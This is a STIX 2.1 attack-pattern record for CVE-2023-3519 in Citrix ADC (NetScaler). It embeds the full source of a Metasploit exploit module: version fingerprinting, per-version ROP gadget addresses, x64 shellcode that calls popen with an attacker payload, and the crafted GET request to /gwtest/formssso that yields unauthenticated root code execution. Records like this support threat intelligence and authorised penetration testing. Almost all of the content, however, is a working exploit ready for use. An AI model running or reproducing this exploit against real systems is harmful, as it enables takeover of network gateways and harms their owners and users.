{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--592bd73d-d1af-4780-b03e-5d06a6184b34",
    "created": "2024-08-14T16:33:40.480968Z",
    "modified": "2024-08-14T16:33:40.480972Z",
    "name": "Citrix ADC (NetScaler) Forms SSO Target RCE",
    "description": " A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of the nsppe process by making a specially crafted HTTP GET request. Successful exploitation results in remote code execution as root. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/http/citrix_formssso_target_rce.rb",
            "external_id": "citrix_formssso_target_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-3519"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/si09VNJhHh/cve-2023-3519"
        },
        {
            "source_name": "reference",
            "url": "https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Citrix ADC (NetScaler) Forms SSO Target RCE',\n        'Description' => %q{\n          A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer\n          overflow of the nsppe process by making a specially crafted HTTP GET request. Successful exploitation results in\n          remote code execution as root.\n        },\n        'Author' => [\n          'Ron Bowes', # Analysis and module\n          'Douglass McKee', # Analysis and module\n          'Spencer McIntyre', # Just the module\n          'rwincey' # Version detection\n        ],\n        'References' => [\n          ['CVE', '2023-3519'],\n          ['URL', 'https://attackerkb.com/topics/si09VNJhHh/cve-2023-3519'],\n          ['URL', 'https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467']\n        ],\n        'DisclosureDate' => '2023-07-18',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix'],\n        'Arch' => [ARCH_CMD],\n        'Payload' => {\n          # at a certain point too much of the stack will get corrupted, should be less than target['fixup_rsp_adjustment']\n          'Space' => 2048,\n          'DisableNops' => true\n        },\n        'Targets' => [\n          [ 'Automatic Targeting', {} ],\n          # In some versions the epilogue reads directly from rbp and since the exploit clobbers it, the value needs to\n          # be restored. In these cases return_rbp_adjustment is defined in the target. If the epilogue pops the values\n          # from the stack, then RBP doesn't need to be restored and return_rbp_adjustment can be left undefined.\n          [\n            'Citrix ADC 13.1-48.47',\n            {\n              'fixup_return' => 0x00782403, # pop rbx; ns_aaa_cookie_valid\n              'fixup_rsp_adjustment' => 0x13a8,\n              'popen' => 0x01da6340,\n              'return' => 0x00611ae9, # jmp rsp; ns_create_cfg_nsp\n              'return_offset' => 168,\n              'timestamp' => 1685774350\n            },\n          ],\n          [\n            'Citrix ADC 13.1-37.38',\n            {\n              'fixup_return' => 0x0077c324, # pop rbx; ns_aaa_cookie_valid\n              'fixup_rsp_adjustment' => 0x13a8,\n              'popen' => 0x01d7e320,\n              'return' => 0x015d131d, # jmp rsp; tfocookie_send_callback\n              'return_offset' => 168,\n              'timestamp' => 1669199916\n            },\n          ],\n          [\n            'Citrix ADC 13.0-91.12',\n            {\n              'fixup_return' => 0x008530a2, # mov rbx, qword [rbp-0x28]; ns_aaa_cookie_valid\n              'fixup_rsp_adjustment' => 0x12e0,\n              'fixup_rbp_adjustment' => 0x190,\n              'popen' => 0x01f42ec0,\n              'return' => 0x024883bf, # jmp rsp; ns_pixl_eval_nvlist_t_typecast_list_t_dynamic\n              'return_offset' => 168,\n              'timestamp' => 1683865450\n            }\n          ],\n          [\n            'Citrix ADC 12.1-65.25',\n            {\n              'fixup_return' => 0x009babca, # mov rbx, qword [rbp-0x28]; ns_aaa_client_handler\n              'fixup_rsp_adjustment' => 0x1560,\n              'fixup_rbp_adjustment' => 0x120,\n              'popen' => 0x01b31e20,\n              'return' => 0x007d0845, # jmp rsp; ns_audit_cmd2strrer\n              'return_offset' => 168,\n              'timestamp' => 1669466053\n            }\n          ],\n          [\n            'Citrix ADC 12.1-64.17',\n            {\n              'fixup_return' => 0x009b98aa, # mov rbx, qword [rbp-0x28]; ns_aaa_client_handler\n              'fixup_rsp_adjustment' => 0x1560,\n              'fixup_rbp_adjustment' => 0x120,\n              'popen' => 0x01b2e960,\n              'return' => 0x01333f18, # jmp rsp; nssmpp_process_message_queue\n              'return_offset' => 168,\n              'timestamp' => 1650533675\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'WfsDelay' => 10\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # version 13.x resource path\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'logon', 'LogonPoint', 'index.html')\n    })\n    return CheckCode::Unknown if res.nil?\n\n    if res.code == 200 && res.body =~ /<title class=\"_ctxstxt_NetscalerGateway\">/\n      mytarget = get_target\n      return CheckCode::Appears(\"Detected #{mytarget.name}.\") if mytarget\n\n      return CheckCode::Detected\n    end\n\n    # version 12.x resource path\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'vpn', 'index.html')\n    })\n    return CheckCode::Unknown if res.nil?\n\n    if res.code == 200 && res.body =~ /Citrix Gateway/ && res.body =~ /AccessGateway\\.ico/\n      mytarget = get_target\n      return CheckCode::Appears(\"Detected #{mytarget.name}.\") if mytarget\n\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n  def get_target\n    return @detected_target if @detection_ran\n\n    @detection_ran = true\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'logon', 'fonts', 'citrix-fonts.css')\n    })\n\n    return nil unless res&.headers&.[]('Last-Modified').present?\n\n    timestamp = DateTime.parse(res.headers['Last-Modified']).to_i\n    @detected_target = targets.select { |t| t.opts['timestamp'] == timestamp }.first\n  end\n\n  def exploit\n    mytarget = target\n    if mytarget.name == 'Automatic Targeting'\n      mytarget = get_target\n      fail_with(Failure::NoTarget, 'The target did not match a known fingerprint for automatic targeting.') if mytarget.nil?\n    end\n\n    shellcode = Metasm::Shellcode.assemble(Metasm::X64.new, Template.render(<<-SHELLCODE, target: mytarget)).encode_string\n      call loc_popen_arg1\n        ; add this to the path for python payloads\n        db \"export PATH=/var/python/bin:$PATH;\"\n        db \"#{Rex::Text.to_hex(payload.encoded)}\", 0\n      loc_popen_arg1:\n        pop  rdi\n\n      call loc_popen_arg2\n        db \"r\", 0\n      loc_popen_arg2:\n        pop rsi\n\n        mov  rax, <%= target['popen'] %>\n        sub  rsp, 0x200\n        call rax\n\n      loc_return:\n        xor rax, rax\n        add rsp, <%= target['fixup_rsp_adjustment'] + 0x200 %>\n        <% if target['fixup_rbp_adjustment'] %>\n        mov rbp, rsp\n        add rbp, <%= target['fixup_rbp_adjustment'] %>\n        <% end %>\n        push     <%= target['fixup_return'] %>\n        ret\n    SHELLCODE\n\n    buffer = rand_text_alphanumeric(mytarget['return_offset'])\n    buffer << [mytarget['return']].pack('Q')\n    buffer << shellcode.bytes.map { |b| (b < 0xa0) ? '%%%02x' % b : b.chr }.join\n\n    send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'gwtest', 'formssso'),\n      'encode_params' => false,  # we'll encode them ourselves\n      'vars_get' => {\n        'event' => 'start',\n        'target' => buffer\n      }\n    })\n  end\n\n  class Template\n    def self.render(template, context = nil)\n      case context\n      when Hash\n        b = binding\n        locals = context.collect { |k, _| \"#{k} = context[#{k.inspect}]; \" }\n        b.eval(locals.join)\n      when NilClass\n        b = binding\n      else\n        raise ArgumentError\n      end\n\n      b.eval(Erubi::Engine.new(template).src)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-07-18",
    "x_mitre_platforms": [
        "['unix']"
    ]
}